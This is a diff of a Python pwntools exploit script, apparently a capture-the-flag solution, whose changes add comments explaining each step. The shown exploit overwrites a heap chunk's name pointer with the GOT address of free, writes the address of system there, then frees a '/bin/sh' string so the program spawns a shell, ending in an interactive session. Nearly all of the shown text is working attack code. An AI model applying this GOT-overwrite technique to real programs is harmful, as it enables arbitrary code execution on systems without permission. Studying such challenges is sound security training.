@@ -92,7 +92,7 @@ if __name__ == "__main__":
     # so we can manipulate 'chunk A-1'->name_ptr.
     # and future set_name() will reference the overwritten pointer. 
 
-    add('E'*16 + p64(b.got['free']), 0xfe)
+    add('E'*16 + p64(b.got['free']), 0xfe)              # overwrite selected->name_ptr with 0x603018 (GOT of free)
     raw_input('after adding E...')
 
     resp = show_player()
@@ -108,13 +108,13 @@ if __name__ == "__main__":
     
     raw_input('before edit name...')
 
-    edit(p64(system_addr))
+    edit(p64(system_addr))                              # selected->name_ptr is 0x603018 -> strcpy(0x603018, system_addr)
 
     raw_input('after editing...')
 
     add('/bin/sh', 0xff)
 
     raw_input('after adding /bin/sh...')
-    r.send('2\n1\n') # delete_player() will try to free("/bin/sh") which becomes system("/bin/sh")
+    r.send('2\n1\n')                                    # delete_player() will try to free("/bin/sh") which becomes system("/bin/sh")
 
     r.interactive()
